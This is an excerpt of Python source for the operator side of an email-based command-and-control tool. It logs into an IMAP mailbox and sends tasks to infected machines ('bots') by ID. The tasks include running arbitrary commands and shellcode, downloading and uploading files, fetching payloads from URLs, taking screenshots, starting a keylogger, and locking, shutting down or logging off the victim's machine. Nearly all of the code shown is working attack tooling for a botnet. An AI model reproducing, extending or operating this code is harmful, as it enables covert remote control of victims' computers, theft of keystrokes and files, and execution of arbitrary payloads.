...
class dicerosbicornis:

    def __init__(self):
        self.c = imaplib.IMAP4_SSL(server)
        self.c.login(mail_user, mail_pwd)
...
if __name__ == '__main__':
    ...
    parser = argparse.ArgumentParser(version='1.0.0', formatter_class=RawTextHelpFormatter)
    ...
    dicerosbicornis = dicerosbicornis()
    jobid = generateJobID()

    if args.list:
        dicerosbicornis.checkBots()

    elif args.info:
        dicerosbicornis.getBotInfo(args.id)

    elif args.cmd:
        dicerosbicornis.sendEmail(args.id, jobid, 'cmd', args.cmd)

    elif args.visitwebsite:
        dicerosbicornis.sendEmail(args.id, jobid, 'visitwebsite', args.visitwebsite)
        
    elif args.message:
        dicerosbicornis.sendEmail(args.id, jobid, 'message', args.message)
        
    elif args.tasks:
        dicerosbicornis.sendEmail(args.id, jobid, 'tasks')
    
    elif args.services:
        dicerosbicornis.sendEmail(args.id, jobid, 'services')
        
    elif args.users:
        dicerosbicornis.sendEmail(args.id, jobid, 'users')
        
    elif args.devices:
        dicerosbicornis.sendEmail(args.id, jobid, 'devices')
        
    elif args.shellcode:
        dicerosbicornis.sendEmail(args.id, jobid, 'execshellcode', args.shellcode.read().strip())

    elif args.download:
        dicerosbicornis.sendEmail(args.id, jobid, 'download', r'{}'.format(args.download))

    elif args.fromurl:
        dicerosbicornis.sendEmail(args.id, jobid, 'downloadfromurl', r'{}'.format(args.fromurl))
        
    elif args.upload:
        dicerosbicornis.sendEmail(args.id, jobid, 'upload', r'{}'.format(args.upload[1]), [args.upload[0]])

    elif args.screen:
        dicerosbicornis.sendEmail(args.id, jobid, 'screenshot')

    elif args.lockscreen:
        dicerosbicornis.sendEmail(args.id, jobid, 'lockscreen')

    elif args.shutdown:
        dicerosbicornis.sendEmail(args.id, jobid, 'shutdown')
        
    elif args.restart:
        dicerosbicornis.sendEmail(args.id, jobid, 'restart')
        
    elif args.logoff:
        dicerosbicornis.sendEmail(args.id, jobid, 'logoff')
        
    elif args.forcecheckin:
        dicerosbicornis.sendEmail(args.id, jobid, 'forcecheckin')

    elif args.keylogger:
        dicerosbicornis.sendEmail(args.id, jobid, 'startkeylogger')

    elif args.stopkeylogger:
        dicerosbicornis.sendEmail(args.id, jobid, 'stopkeylogger')

    elif args.email_check:
        dicerosbicornis.sendEmail(args.id, jobid, 'email_check', args.email_check)

    elif args.jitter:
        dicerosbicornis.sendEmail(args.id, jobid, 'jitter', args.jitter)

    elif args.jobid:
        dicerosbicornis.getJobResults(args.id, args.jobid)
